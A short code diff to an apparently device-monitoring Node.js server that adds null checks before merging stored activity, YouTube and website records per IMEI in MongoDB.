@@ -206,6 +206,10 @@ async function f() {
                 await db.collection("devices").updateOne({imei:imei}, {$set:{activity:data}}, {upsert:true});
                 CommandResults[imei+'sendActivity'] = data;
             }else {
+                if(d.activity == undefined) {
+                    d.activity = {};
+                    d.activity.data = [];
+                }
                 data.data = d.activity.data.concat(ar);
                 CommandResults[imei+'sendActivity'] = data;
                 let le = ar.pop();
@@ -233,6 +237,10 @@ async function f() {
                 ans.pop();
                 await db.collection("devices").updateOne({imei:imei}, {$push:{"youtube.data":{$each:ans}}});
             }
+            if(d.youtube == undefined) {
+                d.youtube = {};
+                d.youtube.data = [];
+            }
             d.youtube.data = d.youtube.data.concat(data.data);
             CommandResults[imei+'sendYoutube'] = d.youtube;
 
@@ -255,6 +263,10 @@ async function f() {
                 let ans = data.data.slice(0);
                 ans.pop();
                 await db.collection("devices").updateOne({imei:imei}, {$push:{"website.data":{$each:ans}}});
+            }
+            if(d.website == undefined) {
+                d.website = {};
+                d.website.data = [];
             }
             d.website.data = d.website.data.concat(data.data);
             CommandResults[imei+'sendWebsites'] = d.website;
